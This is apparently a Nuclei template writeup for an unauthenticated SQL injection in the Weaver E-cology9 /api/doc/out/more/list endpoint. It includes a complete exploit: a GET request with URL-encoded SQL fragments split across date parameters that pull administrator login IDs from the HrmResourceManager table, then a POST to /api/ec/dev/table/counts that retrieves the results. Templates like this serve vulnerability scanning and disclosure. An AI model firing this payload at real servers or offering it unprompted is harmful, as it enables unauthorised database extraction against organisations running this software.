# Nuclei Template: Weaver E-cology9 api/doc/out/more/list SQL Injection
**Template ID:** weaver-ecology9-doc-list-sqli
**Vulnerability Class:** SQL Injection
**Severity:** High
**Source:** Nuclei Template (`weaver-ecology9-doc-list-sqli.yaml`)

## Vulnerability Information & PoC

## Description
Weaver E-cology9 contains a SQL injection vulnerability in the `/api/doc/out/more/list` endpoint. A crafted request can trigger backend SQL execution and generate a temporary `sessionkey`, which can subsequently be used with the `/api/ec/dev/table/counts` endpoint to retrieve query results and confirm successful exploitation.

## Impact
Successful exploitation may allow an unauthenticated attacker to extract sensitive information from the underlying database.

## Steps to reproduce / Exploit Payload
```http
GET /api/doc/out/more/list?isNew=1&elementmore=%7B%22srcType%22%3A%20%222%22%2C%20%22srcContent%22%3A%20%22%2A%2F%3D%28%28-1%22%2C%20%22perpage%22%3A%20%2210%22%7D&docarchivedatefrom=a%27OR-1%2F%2Aa&doccreatedatefrom=%2A%2F%3D%28%2F%2Aa&doclastmoddatefrom=%2A%2FSELECT-3%2Blocate%2F%2A&docarchivedateto=%2A%2F%28hex%28SUBSTRING%28%2F%2A&doccreatedateto=%2A%2Floginid%2C1%2C1%29%29%2C%27073%27%29%20%2F%2A&doclastmoddateto=%2A%2Ffrom%20HrmResourceManager%20limit%200%2C1%29%20OR-1%2F%2A HTTP/1.1
Host: {{Hostname}}

POST /api/ec/dev/table/counts HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

dataKey={{sessionkey}}
```

## References
- https://1diot9.github.io/2026/05/13/泛微e9分析思路/#测绘指纹
